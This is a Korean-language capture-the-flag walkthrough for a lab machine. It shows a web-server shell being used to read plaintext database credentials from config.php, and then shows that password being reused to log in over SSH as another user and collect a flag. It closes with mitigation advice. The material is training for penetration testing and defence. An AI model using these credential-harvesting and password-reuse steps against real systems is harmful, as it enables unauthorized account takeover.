+++
title = "VulnABLE CTF: Flag 2 획득기 (Horizontal Privilege Escalation)"
description = "웹 서버 설정 파일 분석을 통한 비밀번호 재사용 공격 및 일반 유저 권한 획득 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "Privilege Escalation", "Information Gathering", "SSH"]
+++

# VulnABLE CTF: Flag 2 획득 시나리오 (Horizontal Privilege Escalation)

이전 시나리오에서 우리는 파일 업로드 취약점을 이용해 웹 서버의 기본 권한인 `www-data` 계정을 획득했습니다. 하지만 이 계정으로는 시스템의 중요한 설정이나 다른 사용자의 파일을 볼 권한이 부족합니다.

이제 우리의 목표는 제한된 권한을 벗어나, **일반 유저(User) 권한으로 수평적 권한 상승(Horizontal Privilege Escalation)**을 이루어내고 두 번째 플래그를 찾는 것입니다!

---

## 🕒 1. 시스템 내부 정보 수집 (Internal Enumeration)
쉘(Shell)을 얻자마자 가장 먼저 해야 할 일은 "내가 누구인지, 여기엔 누가 살고 있는지"를 확인하는 것입니다.

```bash
# 현재 권한 확인
$ whoami
www-data

# 시스템에 존재하는 실제 유저(홈 디렉터리를 가진 유저) 확인
$ ls -la /home
drwxr-xr-x  4 root  root  4096 Oct 10 12:00 .
drwxr-xr-x 20 root  root  4096 Oct 10 11:55 ..
drwxr-xr-x  5 user1 user1 4096 Nov 01 09:30 user1
```

**[사고 과정]**
`/home` 디렉터리에 `user1`이라는 계정이 존재함을 확인했습니다. 저의 다음 타겟은 바로 이 `user1` 계정을 탈취하는 것입니다. `user1`의 홈 디렉터리에 들어가려고 시도해봅니다.

```bash
$ cd /home/user1
bash: cd: /home/user1: Permission denied
```

역시나 `www-data` 권한으로는 들어갈 수 없네요. 다른 방법이 필요합니다.

---

## 🕒 2. 보물찾기: 웹 서버의 설정 파일 뒤지기
웹 해킹을 통해 얻은 초기 쉘(`www-data`)에서 가장 유용하게 써먹을 수 있는 정보는 **웹 애플리케이션의 설정 파일**입니다. 웹 서버는 데이터베이스와 연결하기 위해 설정 파일 어딘가에 비밀번호를 "평문(Plaintext)"으로 저장해두는 경우가 많습니다.

```bash
# 웹 루트 디렉터리로 이동하여 숨겨진 파일 포함 모두 확인
$ cd /var/www/html
$ ls -la
-rw-r--r-- 1 www-data www-data 1024 Oct 10 12:00 index.php
drwxr-xr-x 2 www-data www-data 4096 Oct 10 12:05 uploads
-rw-r--r-- 1 www-data www-data  256 Oct 10 11:50 config.php
```

`config.php`라는 아주 수상한(?) 파일이 보입니다. 이 파일의 내용을 읽어보겠습니다.

```bash
$ cat config.php
```
```php
<?php
// Database configuration
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'SuperS3cr3tP@ssw0rd!';
$db_name = 'vulnable_db';
?>
```

**[사고 과정]**
빙고! 데이터베이스 접속용 비밀번호(`SuperS3cr3tP@ssw0rd!`)를 발견했습니다. 

---

## 🕒 3. 공격 원리: 비밀번호 재사용 (Password Reuse)
인간의 심리상, 기억하기 어려운 비밀번호를 서비스마다 다르게 설정하는 사람은 많지 않습니다. 데이터베이스 접속용 비밀번호가 시스템 계정(`user1`)의 비밀번호와 동일할 가능성이 매우 높습니다! 이를 **비밀번호 재사용 공격(Password Reuse Attack)**이라고 합니다.

첫 번째 Nmap 스캔 때 타겟 서버에 **22번 포트(SSH)**가 열려 있던 것이 기억나시나요? 
방금 찾은 비밀번호를 이용해 내 컴퓨터에서 타겟 머신으로 SSH 접속을 시도해봅니다.

---

## 🕒 4. 수평적 권한 상승 수행 (Exploitation)

내 컴퓨터의 터미널을 열고 다음 명령어를 입력합니다.

```bash
# user1 계정으로 타겟 머신(10.10.10.10)에 SSH 접속 시도
$ ssh user1@10.10.10.10

user1@10.10.10.10's password: [SuperS3cr3tP@ssw0rd! 입력]
```

**접속 성공!**
```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

user1@vulnable:~$ whoami
user1
```

권한이 `www-data`에서 `user1`으로 상승(Horizontal Privilege Escalation)했습니다!

---

## 🕒 5. 두 번째 플래그 획득! 🚩

이제 아까는 들어가지 못했던 `user1`의 홈 디렉터리를 마음껏 탐색할 수 있습니다.

```bash
$ pwd
/home/user1

$ ls -la
-rw-r--r-- 1 user1 user1  220 Oct 10 11:55 .bash_logout
-rw-r--r-- 1 user1 user1 3771 Oct 10 11:55 .bashrc
-rw-r--r-- 1 user1 user1  807 Oct 10 11:55 .profile
-rw-r----- 1 user1 user1   38 Nov 01 09:30 flag2.txt

$ cat flag2.txt
# 출력: THM{p4ssw0rd_r3us3_1s_d4ng3r0us}
```

두 번째 플래그 획득 완료입니다! 🎉

---

## 🛡️ 방어 대책 (Mitigation)
초보 모의해커가 배워야 할 두 번째 방어 수칙입니다:

1. **비밀번호 재사용 금지**: 데이터베이스 비밀번호, 웹 관리자 비밀번호, 그리고 시스템(SSH) 계정의 비밀번호는 **반드시 모두 다르게** 설정해야 합니다.
2. **설정 파일 권한 분리**: `config.php` 같은 중요 파일은 최소한의 권한(예: 웹 서버 엔진만 읽을 수 있도록)만 부여해야 합니다.
3. **SSH 보안 강화**: SSH 접속은 비밀번호 인증 대신 **공개키(Public Key) 인증** 방식만을 허용하도록 설정(`PasswordAuthentication no`)하면 이러한 사전 공격/재사용 공격을 완벽히 차단할 수 있습니다.

이제 일반 유저 권한을 얻었으니, 다음 단계는 시스템의 최고 관리자인 **Root(루트)** 권한을 탈취하는 수직적 권한 상승(Vertical Privilege Escalation)에 도전해보겠습니다!